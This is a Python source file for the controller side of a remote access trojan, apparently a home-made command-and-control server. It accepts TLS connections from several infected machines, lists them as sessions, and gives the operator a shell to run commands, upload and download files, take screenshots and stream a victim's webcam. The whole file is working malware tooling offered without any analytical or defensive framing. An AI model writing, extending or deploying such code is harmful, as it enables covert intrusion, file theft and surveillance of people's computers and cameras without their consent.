from os import error
import socket
import base64
import ssl
import simplejson
from queue import Queue
import threading
from prettytable import PrettyTable
import pickle
import struct
import cv2
queue = Queue()
class Recv_Cam:
    def __init__(self,HOST,PORT):
        self.us=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.us.bind((HOST,PORT))
        self.us.listen(0)
        self.conn,self.addr=self.us.accept()
    def recv_data(self):
        data = b'' 
        payload_size = struct.calcsize("L") 

        while True:
            while len(data) < payload_size:
                data += self.conn.recv(4096)

            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack("L", packed_msg_size)[0] 

            while len(data) < msg_size:
                data += self.conn.recv(4096)

            frame_data = data[:msg_size]
            data = data[msg_size:]

            frame = pickle.loads(frame_data)
            
            cv2.imshow('frame', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                self.conn.close()
                cv2.destroyAllWindows()
class SocketListener:
    def __init__(self,ip,port):
        self.current_conn=""
        self.client_list=[]
        self.connection_list=[]
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((ip, port))
        self.s = ssl.wrap_socket(self.s,keyfile="key.pem", certfile="cert.pem", server_side=True)
        self.s.listen(0)
        print("Listening...")
        
    def accept_client(self):
        for c in self.connection_list:
            c.close()
        del self.connection_list[:]
        del self.client_list[:]
        
        while True:
            (self.my_connection, my_address) = self.s.accept()
            self.my_connection.setblocking(True)
            print("\n connection ok from" +str(my_address))
            self.client_list.append(my_address)
            self.connection_list.append(self.my_connection)

    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.current_conn.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.current_conn.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue
            
    def command_execution(self, command_input):
        self.json_send(command_input)

        if command_input[0] == "quit":
            self.my_connection.close()
            exit()
        if command_input[0]=="access_camera":
            try:
                a_c=Recv_Cam("192.168.1.39",9090)
                a_c.recv_data()
            except Exception as e:
                print(e)
        
        return self.json_receive()

    def save_file(self,path,content):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download OK"

    def get_file_content(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def take_screen_shot(self,content):
        with open("screenshot.png", "wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "screen shot saved"

    def get_shell(self):
        while True:
            command_input = input("Enter command: ")
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)

                command_output = self.command_execution(command_input)

                if command_input[0] == "download" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)
                
                if command_input[0]=="screen_shot" and "Error" not in command_output:
                    command_output=self.take_screen_shot(command_output)
                if command_input[0]=="back":
                    break
            except Exception:
                command_output = "Error"
            print(command_output)

    def dashboard(self):
        
        while True:
            cmd=input("dashboard> ")
            cmd=cmd.split(" ")
            if cmd[0]=="sessions":
                statu=""
                x=PrettyTable()
                x.field_names=["id","ip_addresses","status"]
                for id, ip in enumerate(self.client_list):
                    self.current_conn=self.connection_list[id]
                    try:
                        self.current_conn.send("check_connection".encode("utf-8"))
                        statu="active"
                    except Exception:
                        statu="disconnected"
                    x.add_row([id,ip,statu])
                print(x)
            elif cmd[0]=="select":
                target=int(cmd[1])
                try:
                    self.current_conn=self.connection_list[target]
                except:
                    print("invalid connection")
                if self.current_conn is not None:
                    print("connected to "+ str(self.client_list[target]))
                    self.get_shell()
            elif cmd[0]=="close":
                self.s.close()
                exit()


def setup_threads():
    server = SocketListener('192.168.1.39', 443)
    for _ in range(2):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True  
        t.start()
    return


def work(server):
    while True:
        x = queue.get()
        if x == 0: 
            server.accept_client()
        if x == 1:  
            server.dashboard()
        queue.task_done() 
    return


def create_jobs():
    for x in range(2):
        queue.put(x)
    queue.join()
    return

# the main function
def main():
    setup_threads()
    create_jobs()


if __name__ == '__main__':
    main()
